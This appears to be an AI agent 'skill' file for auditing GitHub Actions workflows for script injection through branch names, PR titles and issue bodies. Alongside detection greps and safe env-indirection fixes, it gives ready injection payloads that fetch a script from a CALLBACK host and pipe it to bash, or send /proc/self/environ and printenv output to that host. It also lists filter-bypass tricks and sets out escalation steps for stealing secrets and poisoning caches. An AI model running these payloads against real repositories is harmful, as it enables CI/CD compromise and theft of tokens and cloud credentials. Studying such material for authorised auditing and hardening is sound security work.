---
name: github-actions-script-injection
description: >
  Use when auditing GitHub Actions workflows for script injection vulnerabilities via
  unsanitized context expressions. Trigger on: "github actions injection", "workflow
  injection", "head_ref injection", "github context injection", "pwn request",
  "github.head_ref", "github.event.pull_request.title", "github.event.issue.body",
  pull_request_target workflows, run: steps interpolating GitHub context variables,
  CI/CD script injection, GitHub Actions security audit.
license: MIT
compatibility: Designed for Claude Code. Requires access to target repository's .github/workflows/.
metadata:
  category: cicd
  version: "0.1"
  source: https://adnanthekhan.com/posts/angular-compromise-through-dev-infra/
  source_types: blog_post
---

# GitHub Actions Script Injection

## What Is Broken and Why

GitHub Actions workflows interpolate context expressions like `${{ github.head_ref }}`
directly into shell `run:` steps at workflow parse time — before the shell executes.
An attacker who controls the input (branch name, PR title, issue body, commit message)
can inject arbitrary shell commands that execute with the workflow's token permissions.
Even a read-only token becomes dangerous if it can be leveraged into cache poisoning,
secret exfiltration via subsequent workflows, or SSRF to internal services.

## Key Signals

- `run:` steps containing `${{ github.head_ref }}`, `${{ github.event.pull_request.title }}`,
  `${{ github.event.pull_request.body }}`, `${{ github.event.issue.title }}`,
  `${{ github.event.issue.body }}`, `${{ github.event.comment.body }}`
- `pull_request_target` trigger (runs in base repo context — elevated permissions + secrets)
- `workflow_run` consuming artifacts or outputs from untrusted workflows
- `issue_comment`, `pull_request_review_comment` triggers with body interpolation
- Workflows that echo, log, or use attacker-controlled strings in shell steps
- `${{ toJson(github.event) }}` piped into scripts
- Missing `env:` variable indirection (safe pattern uses `env: VAR: ${{ expr }}` then `$VAR`)

## Methodology

1. Enumerate all workflow files: `find .github/workflows -name "*.yml" -o -name "*.yaml"`
2. Grep for dangerous context variables used directly in `run:` blocks:
   ```
   grep -rn 'run:' .github/workflows/ | grep -E '\$\{\{.*github\.(head_ref|event\.'
   ```
3. For each hit, trace the trigger: is it `pull_request`, `pull_request_target`, `issue_comment`, `workflow_dispatch`?
4. Check token permissions: `permissions:` block or default `GITHUB_TOKEN` scope.
5. Identify what secrets are available in the workflow environment.
6. Craft a branch name (or PR title/body) with injection payload.
7. Open a PR from a fork using the malicious branch name to trigger the workflow.
8. Confirm RCE via out-of-band callback (DNS/HTTP to CALLBACK server).
9. Escalate: exfiltrate secrets, poison cache, pivot to downstream workflows.

## Payloads & Tools

```bash
# Malicious branch name for github.head_ref injection
# Uses ${IFS} to avoid spaces (which break branch names)
git checkout -b '$({curl,-sSfL,https://CALLBACK/payload.sh}${IFS}|${IFS}bash)'
git push origin HEAD

# Simpler OOB detection payload (DNS exfil)
git checkout -b '$(curl${IFS}https://CALLBACK/$(cat${IFS}/proc/self/environ|base64))'

# Exfiltrate GITHUB_TOKEN
git checkout -b '$(curl${IFS}-d${IFS}@/proc/self/environ${IFS}https://CALLBACK)'

# lucky-commit: make malicious commit SHA match a short prefix (stealth)
lucky-commit SHORTSHA
```

```bash
# Grep workflows for injection points
grep -rn '\${{' .github/workflows/ | grep 'run:' -A5 | \
  grep -E 'head_ref|event\.pull_request\.(title|body)|event\.issue\.(title|body)|event\.comment\.body'

# Check pull_request_target triggers (highest risk)
grep -rn 'pull_request_target' .github/workflows/
```

## Bypass Techniques

- **Space bypass**: use `${IFS}` instead of spaces in branch names
- **Quote bypass**: use `$'...'` ANSI-C quoting or hex encoding `$'\x63\x75\x72\x6c'`
- **Short SHA collision**: use `lucky-commit` to craft a commit whose SHA matches a known prefix, making the imposter commit look legitimate in reviews
- **Restricted characters in branch names**: use `{cmd,arg1,arg2}` brace expansion, `$()` subshell, backtick substitution
- **Workflow expression filters**: if `${{ github.head_ref }}` is filtered, try `${{ github.event.pull_request.head.ref }}` or other equivalent paths in the event payload

## Exploitation Scenarios

**Scenario 1 — Secret exfiltration via branch name**
Setup: Workflow runs on `pull_request` trigger with `run: echo "Testing ${{ github.head_ref }}"`.
Token has read-only permissions but the workflow environment contains `AWS_ACCESS_KEY_ID`.
Trigger: Attacker opens PR from fork with branch named `$(printenv|curl${IFS}-d${IFS}@-${IFS}https://CALLBACK)`.
Impact: All environment variables including secrets exfiltrated to attacker's server.

**Scenario 2 — Cache poisoning pivot (low-priv token)**
Setup: Workflow has read-only `GITHUB_TOKEN` — no direct secret access.
Trigger: Injection deploys Cacheract, fills cache past 10 GB, plants poisoned `node_modules`.
Impact: Downstream privileged workflow restores poisoned cache, executes attacker code with elevated token.
(See: `github-actions-cache-poisoning` skill for full technique.)

**Scenario 3 — pull_request_target full compromise**
Setup: Workflow uses `pull_request_target` (runs in base repo context with write token + secrets).
Trigger: Attacker forks repo, opens PR with injected PR body containing `${{ github.event.pull_request.body }}` payload.
Impact: Workflow executes with base repo's full write token — direct push to main, secret exfiltration, artifact tampering.

## False Positives

- Expression inside `if:` condition only — not executed as shell, not injectable
- Expression assigned to `env:` variable with no subsequent shell interpolation
- Expression used only in `with:` action inputs — depends on action implementation
- Sanitized via `${{ inputs.value }}` where `inputs` come from `workflow_dispatch` with `type: choice`

## Fix Patterns

```yaml
# WRONG: direct interpolation into shell
- run: echo "Branch: ${{ github.head_ref }}"

# CORRECT: assign to env var, reference via shell variable
- run: echo "Branch: $BRANCH_NAME"
  env:
    BRANCH_NAME: ${{ github.head_ref }}
```

- Use `env:` indirection for all attacker-controlled context values — shell variables are not parsed as code
- Prefer `pull_request` over `pull_request_target` unless base repo context is strictly necessary
- Pin third-party actions to full commit SHAs, not tags
- Restrict `permissions:` to minimum required (`contents: read` only when possible)
- Use `harden-runner` (StepSecurity) to detect unexpected network calls during CI

## Related Skills

[[github-actions-cache-poisoning]] is the natural escalation when script injection yields only a read-only token — the injected code writes poisoned cache entries that a later privileged workflow restores. [[pwn-request]] is the trigger mechanism that causes this skill to fire: a `pull_request_target` workflow checked out from an attacker-controlled fork is how script injection reaches a privileged context. [[cicd-bot-command-injection]] exploits the same untrusted-input-in-workflow pattern but through comment triggers rather than branch names.
